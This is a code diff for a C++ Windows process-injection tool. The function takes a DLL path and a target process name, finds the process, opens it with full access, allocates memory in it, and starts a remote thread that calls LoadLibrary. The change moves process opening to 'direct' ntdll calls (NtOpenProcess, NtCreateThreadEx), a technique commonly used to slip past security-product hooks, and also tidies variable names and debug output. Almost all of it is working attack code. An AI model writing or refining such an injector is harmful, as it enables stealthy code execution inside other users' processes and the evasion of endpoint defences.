@@ -80,6 +80,11 @@ DWORD getPidByName(const char* processName) {
     entry.dwSize = sizeof(PROCESSENTRY32); // size of the structure
     char buf[MAX_PATH] = {}; // buffer to store the name of the executable
     size_t charsConverted = 0;
+    
+    // for direct calls via ntdll.dll 
+    OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };
+    NTSTATUS status = 0x0;
+    HANDLE hProcess = NULL;
 
     // snapshot of all processes in the system
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -96,9 +101,12 @@ DWORD getPidByName(const char* processName) {
 
             // check if current process name matches the target process name
             if (_stricmp(buf, processName) == 0) {
-                // open the process with all possible access rights
-                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(entry.th32ProcessID));
-                if (hProcess != NULL) {
+                // open the process with all possible access rights (n.b. not calling via ntdll as we dont yet have the pid)
+                ULONG_PTR processIdPtr = static_cast<ULONG_PTR>(entry.th32ProcessID);
+                CLIENT_ID clientId = { reinterpret_cast<HANDLE>(processIdPtr), nullptr };
+                status = NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION, &OA, &clientId); // direct call
+
+                if (status == 0x0) {
                     CloseHandle(snapshot); // close the snapshot handle as it is no longer needed
                     return entry.th32ProcessID; // return the process ID TODO just return the handle?
                 }
@@ -127,9 +135,9 @@ DWORD getPidByName(const char* processName) {
  */
 int openProcAndExec(const char *pathToDLL, const char *processToInj) {
 
-    // vars
     OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };
-    NTSTATUS STATUS = 0x0;
+    NTSTATUS status = 0x0;
+    HANDLE hProcess = NULL;
 
     // validate input params 
     if (pathToDLL == NULL || processToInj == NULL) {
@@ -155,15 +163,12 @@ int openProcAndExec(const char *pathToDLL, const char *processToInj) {
     }
 
     // open the target process
-    HANDLE hProcess = NULL; // required as using direct syscalls
     ULONG_PTR processIdPtr = static_cast<ULONG_PTR>(pid);
-    CLIENT_ID CLIENT_ID = { reinterpret_cast<HANDLE>(processIdPtr), nullptr }; // required as using direct syscalls
+    CLIENT_ID clientId = { reinterpret_cast<HANDLE>(processIdPtr), nullptr }; // required as using direct syscalls
     
-    printf("Calling NtOpenProcess\n");
-    STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CLIENT_ID); // direct call
-    printf("Call made to NtOpenProcess with status: 0x%lx\n", static_cast<unsigned long>(STATUS));
+    status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &clientId); // direct call
 
-    if (STATUS != 0x0) {
+    if (status != 0x0) {
         printf("%lu\n", pid);
         logError("Failed to open target process");
         return -1;
@@ -209,14 +214,14 @@ int openProcAndExec(const char *pathToDLL, const char *processToInj) {
     */
     // NTSTATUS remoteThread = localCreateRemoteThread(&hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibA_addr, alloc, 0, NULL);
     HANDLE hThread = NULL;
-    STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, (PVOID)loadlib, alloc, FALSE, 0, 0, 0, 0);
+    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, (PVOID)loadlib, alloc, FALSE, 0, 0, 0, 0);
 
-    if (STATUS != 0x0) {
+    if (status != 0x0) {
         VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
         CloseHandle(hProcess);
 
         char errorMessage[256];
-        sprintf(errorMessage, "Failed to create remote thread, error: 0x%lx", STATUS);
+        sprintf(errorMessage, "Failed to create remote thread, error: 0x%lx", status);
         logError(errorMessage);
 
         return -1; // return error if thread creation fails
